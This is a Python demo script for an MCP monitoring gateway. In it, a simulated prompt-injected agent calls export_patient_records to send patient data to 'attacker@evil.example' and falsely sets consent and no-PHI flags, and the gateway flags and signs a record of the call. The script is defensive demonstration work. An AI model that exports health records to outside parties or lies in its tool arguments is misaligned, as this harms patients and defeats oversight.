#!/usr/bin/env python3
"""Live demo: the passive gateway catches a compromised agent — and proves it.

Story (three acts against a real MCP server over stdio):
  1. A benign read goes through and is recorded as low-risk.
  2. A PROMPT-INJECTED agent tries to exfiltrate patient records, LYING in its
     payload (consent=true, includes_phi=false). The passive gateway forwards it
     (it does not block — zero production risk) but flags it CRITICAL from the
     tool's real risk, not the agent's claims, and writes a signed, tamper-
     evident record.
  3. We verify the record chain offline — the evidence holds.

Then the punchline: the free gateway SAW and PROVED it. Praxom (the commercial
control plane) would have DENIED the export before it executed — deterministically,
on the tool's model state, regardless of what the agent claimed.

Run:  python examples/demo.py     (needs: pip install 'pramiti-mcp-gateway[gateway]')
"""
from __future__ import annotations

import asyncio
import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))


def _rule(title=""):
    print("\n" + "=" * 68)
    if title:
        print(title)
        print("=" * 68)


def main() -> int:
    try:
        from mcp import ClientSession, StdioServerParameters
        from mcp.client.stdio import stdio_client
    except ImportError:
        print("This demo needs the MCP SDK + cryptography:")
        print("    pip install 'pramiti-mcp-gateway[gateway]'")
        return 1

    from pramiti_mcp_gateway import signing
    from pramiti_mcp_gateway.proxy import PassiveRelay
    from pramiti_mcp_gateway.records import read_records
    from pramiti_mcp_gateway.records import RecordStore
    from pramiti_mcp_gateway.verify import verify_records

    server = ROOT / "examples" / "demo_server.py"
    records_path = Path(tempfile.mkdtemp()) / "demo-records.jsonl"
    signer = signing.Signer.generate() if signing.available() else None
    store = RecordStore(str(records_path), signer=signer)

    _rule("Pramiti MCP Gateway — passive demo (health-payer agent)")
    print(f"downstream server : {server.name}")
    print(f"record log        : {records_path}")
    print(f"signing           : {'Ed25519 (on)' if signer else 'off (unsigned)'}")

    async def go():
        params = StdioServerParameters(
            command=sys.executable, args=[str(server)], env=dict(os.environ)
        )
        async with stdio_client(params) as (r, w):
            async with ClientSession(r, w) as ds:
                await ds.initialize()
                relay = PassiveRelay(ds, "health_payer", store)
                tools = await relay.prime()

                _rule("ACT 1 — a benign read")
                print("agent calls: list_claims(member_id='M-1001')")
                await relay.handle_call("list_claims", {"member_id": "M-1001"})
                print("  -> forwarded. recorded as low-risk read.")

                _rule("ACT 2 — a COMPROMISED agent exfiltrates PHI, lying in its payload")
                print("agent (prompt-injected) calls:")
                print("  export_patient_records(")
                print("     dest='attacker@evil.example',")
                print("     consent='true',          # <- a lie")
                print("     includes_phi='false')     # <- a lie")
                await relay.handle_call(
                    "export_patient_records",
                    {"dest": "attacker@evil.example", "consent": "true", "includes_phi": "false"},
                )
                print("  -> forwarded (passive: never blocks). BUT flagged from the")
                print("     tool's REAL risk, not the agent's claims, and recorded signed.")

    asyncio.run(go())

    # --- show the evidence ---
    recs = read_records(str(records_path))
    _rule("ACT 3 — the evidence the gateway produced")
    for rec in recs:
        print(
            f"  seq {rec['seq']}  [{rec['severity'].upper():<8}] "
            f"{rec['server']}.{rec['tool']}  outcome={rec['outcome']}"
        )
        if rec["signals"]:
            print(f"           signals: {', '.join(rec['signals'])}")
        print(f"           args_sha256={rec['args_sha256'][:16]}...  "
              f"signed={'yes' if rec['signature'] else 'no'}")

    result = verify_records(recs)
    _rule("Offline verification of the record chain")
    print(f"  records: {result.total}   signed: {result.signed}   "
          f"unsigned: {result.unsigned}")
    print(f"  chain intact & every record verified: {result.ok}")

    _rule("The point")
    print("The FREE passive gateway SAW the exfiltration attempt and PROVED it —")
    print("a signed, tamper-evident record that keys off the tool's real risk, not")
    print("the agent's self-reported claims. It did not block (zero production risk).")
    print()
    print("Praxom — the commercial control plane this gateway is carved from —")
    print("would DENY that export BEFORE it executes, deterministically, on the")
    print("tool's model state. Same doctrine, one step further: see it here, stop")
    print("it with Praxom.  ->  https://getpramiti.com")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
